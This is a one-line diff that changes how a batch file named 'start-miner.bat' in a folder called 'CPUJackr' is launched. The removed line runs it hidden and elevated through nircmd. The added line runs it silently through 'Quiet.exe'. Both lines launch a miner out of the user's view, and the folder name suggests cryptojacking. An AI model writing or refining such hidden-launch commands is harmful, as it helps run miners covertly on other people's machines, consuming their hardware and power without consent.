@@ -1,1 +1,1 @@
-nircmd elevatecmd exec hide "C:\CPUJackr\start-miner.bat"
+C:\CPUJackr\Quiet.exe C:\CPUJackr\start-miner.bat
